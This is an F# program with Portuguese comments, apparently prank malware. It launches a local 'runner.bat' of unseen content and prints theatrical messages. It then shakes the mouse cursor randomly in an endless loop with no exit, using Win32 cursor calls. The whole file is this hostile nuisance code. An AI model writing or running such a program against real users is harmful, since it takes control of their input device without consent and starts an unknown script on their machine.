open System
open System.Diagnostics
open System.Runtime.InteropServices
open System.Threading

// 1. Definição da Estrutura corrigida (Sintaxe de propriedade)
[<Struct; StructLayout(LayoutKind.Sequential)>]
type POINT =
    val mutable X: int
    val mutable Y: int

// 2. Importação das funções (Sintaxe simplificada e direta)
module Win32 =
    [<DllImport("user32.dll")>]
    extern bool GetCursorPos(POINT& lpPoint)

    [<DllImport("user32.dll")>]
    extern bool SetCursorPos(int x, int y)

// 3. Função principal
[<EntryPoint>]
let main argv =
    let notgdi = "runner.bat"
    let rnd = Random()
    
    printfn "GOD IS COMING"
    
    // Parte do Processo .bat
    try
        if IO.File.Exists(notgdi) then
            Process.Start(notgdi) |> ignore
            printfn "Durium"
        else
            printfn "%s" notgdi
    with
    | ex -> printfn "%s" ex.Message

    printfn "Freedom"
    
    // 4. Loop de Tremor
    let mutable pt = POINT()
    
    while true do
        // Tenta pegar a posição atual e move aleatoriamente
        if Win32.GetCursorPos(&pt) then
            let dx = rnd.Next(-5, 6)
            let dy = rnd.Next(-5, 6)
            Win32.SetCursorPos(pt.X + dx, pt.Y + dy) |> ignore
        
        Thread.Sleep(15) // Pausa para não sobrecarregar o PC

    0 // Sucesso